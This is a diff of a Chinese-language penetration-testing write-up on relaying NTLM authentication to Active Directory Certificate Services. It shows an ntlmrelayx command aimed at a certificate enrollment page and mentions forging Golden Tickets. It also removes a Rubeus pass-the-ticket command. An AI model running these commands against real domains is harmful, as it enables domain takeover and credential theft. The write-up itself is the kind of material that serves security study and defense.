@@ -17,7 +17,9 @@ AD CS（Active Directory 证书服务）特别有趣，因为它提供默认接�
 
 攻击机器上
 
+```python
 python3 ntlmrelayx.py -debug -smb2support --target http://172.23.119.119/certsrv/certfnsh.asp --adcs --template KerberosAuthentication
+```
 
 ![image-20210813111552386](https://gitee.com/a4m1n/tuchuang/raw/master/pic/image-20210813111552386.png)
 
@@ -43,10 +45,5 @@ keko利用
 
 拥有 NTLM 哈希允许我们创建`krbtgt`[Kerberos Golden Tickets]()。
 
-用rubeus 也可以  
-
-.\Rubeus.exe asktgt /outfile:kirbi /user:Dc02$ /ptt /certificate:MIIRVQIBAzCCER /PTT
-
-![image-20210813113100396](https://gitee.com/a4m1n/tuchuang/raw/master/pic/image-20210813113100396.png)
 
 
